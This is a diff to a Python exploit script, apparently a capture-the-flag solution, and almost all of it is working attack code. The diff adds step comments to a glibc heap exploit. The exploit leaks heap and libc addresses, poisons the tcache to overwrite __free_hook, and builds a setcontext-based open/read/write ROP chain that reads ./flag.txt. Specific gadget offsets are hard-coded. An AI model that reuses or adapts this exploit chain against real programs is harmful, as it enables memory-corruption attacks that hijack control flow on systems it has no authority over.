@@ -46,11 +46,14 @@ print("heap_base =", hex(heap_base))
 Alloc(1100, "A"*4)
 Free()
 Write(heap_base+0x20a0, heap_base+0x1ef0)
+
+# Make 0xf0 size chunk for free() 
 Alloc(0x60, "\n")
 Alloc(0x60, "\n")
 Alloc(0x60, "\n")
 Alloc(0x68, p64(0)*11+p64(0xf1))
 
+# libc leak
 Alloc(0xe0, "\n")
 Alloc(0xe0, "A"*15+"\n")
 View()
@@ -58,10 +61,12 @@ s.recvuntil("A"*15+"\n")
 libc_leak = u64(s.recv(6)+b"\x00\x00")
 libc_base = libc_leak - 0x1ecc40
 free_hook = libc_base + libc.sym.__free_hook
-#malloc_hook = libc_base + libc.sym.__malloc_hook
 
-setcontext = libc_base + libc.sym.setcontext
-mov_rdx_rdi = libc_base + 0x1518b0 # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
+print("libc_leak =", hex(libc_leak))
+print("libc_base =", hex(libc_base))
+
+setcontext   = libc_base + libc.sym.setcontext
+mov_rdx_rdi  = libc_base + 0x1518b0 # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
 ret_addr     = libc_base + 0x22679 # ret;
 syscall_ret  = libc_base + 0x630d9 # syscall; ret;
 pop_rax_ret  = libc_base + 0x47400 # pop rax; ret;
@@ -70,15 +75,14 @@ pop_rsi_ret  = libc_base + 0x2604f # pop rsi; ret;
 pop_rdx_ret  = libc_base + 0x119241 # pop rdx; pop r12; ret;
 xchg_eax_edi = libc_base + 0xf1b95 # xchg eax, edi; ret;
 
-print("libc_leak =", hex(libc_leak))
-print("libc_base =", hex(libc_base))
-
+# Write __free_hook in tcache 
 Free()
 Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
 
 for i in range(5):
   Alloc(0x70, "\n")
 
+# Write ROP chain of Open/Read/Write in heap memory
 buf  = b"A"*0x20
 buf += p64(setcontext+61)
 buf += b"B"*0x78
@@ -108,7 +112,10 @@ buf += p64(syscall_ret)
 buf += b"./flag.txt\x00"
 Alloc(0x200, buf)
 
+# Write ROP gadget address(mov rdx, qword ptr [rdi + 8];...) in __free_hook
 Alloc(0x70, p64(0)+p64(heap_base+0x22c0)+p64(mov_rdx_rdi))
+
+# Start ROP chain
 Free()
 
 s.interactive()
